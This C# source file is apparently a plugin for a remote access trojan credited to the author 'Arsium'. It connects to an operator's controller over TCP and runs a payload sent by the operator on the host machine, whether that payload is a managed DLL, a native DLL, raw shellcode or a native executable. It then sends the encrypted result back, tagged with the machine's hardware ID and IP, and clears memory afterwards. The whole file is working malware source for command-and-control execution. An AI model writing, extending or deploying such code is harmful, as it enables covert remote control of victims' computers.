using Shared;
using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using static Shared.Serializer;
using static Shared.Utils;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    public static class Launch
    {
        public async static Task Main(Host H, string HWID, object[] Param, Socket Base, string key, string BaseIP)
        {
            try
            {
                Socket S = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                IPEndPoint ep = new IPEndPoint(IPAddress.Parse(H.host), H.port);
                S.Connect(ep);
                Shared.PacketTypes.PacketType T = (Shared.PacketTypes.PacketType)Param[0];
                Data D = new Data();
                byte[] b;
                ReturnHelper res;
                switch (T)
                {
                    case Shared.PacketTypes.PacketType.EXEC_MANAGED_DLL:
                        b = (byte[])Param[1];
                        res = await Task.Run(() => Functions.ExecuteManaged(ref b, Param[2].ToString()));
                        D.Type = Shared.PacketTypes.PacketType.EXEC_MANAGED_DLL;
                        D.HWID = HWID;
                        D.DataReturn = new object[] { res , Param[3].ToString() };
                        D.IP_Origin = BaseIP;
                        await Task.Run(() => Shared.Serializer.SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key))));
                        break;

                    case PacketTypes.PacketType.EXEC_NATIVE_DLL:
                        b = (byte[])Param[1];
                        res = await Task.Run(() => Functions.ExecuteUnmanaged(b));
                        D.Type = Shared.PacketTypes.PacketType.EXEC_NATIVE_DLL;
                        D.HWID = HWID;
                        D.DataReturn = new object[] { res , Param[2].ToString() };
                        D.IP_Origin = BaseIP;
                        await Task.Run(() => Shared.Serializer.SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key))));
                        break;

                    case PacketTypes.PacketType.EXEC_SHELL_CODE:
                        b = (byte[])Param[1];
                        res = await Task.Run(() => Functions.ExecuteShellCode(b));
                        D.Type = Shared.PacketTypes.PacketType.EXEC_SHELL_CODE;
                        D.HWID = HWID;
                        D.DataReturn = new object[] { res, Param[2].ToString() };
                        D.IP_Origin = BaseIP;
                        await Task.Run(() => Shared.Serializer.SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key))));
                        break;

                    case PacketTypes.PacketType.EXEC_NATIVE_EXE:
                        b = (byte[])Param[1];
                        res = await Task.Run(() => Functions.ExecuteNativePE(b));
                        D.Type = Shared.PacketTypes.PacketType.EXEC_NATIVE_EXE;
                        D.HWID = HWID;
                        D.DataReturn = new object[] { res, Param[2].ToString() };
                        D.IP_Origin = BaseIP;
                        //await Task.Run(() => Shared.Serializer.SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key))));
                        break;

                }
                S.Close();
                S.Dispose();

            }
            catch (Exception)
            {
            }
            finally
            {
                Shared.Utils.ClearMem();
            }
        }
    }
}
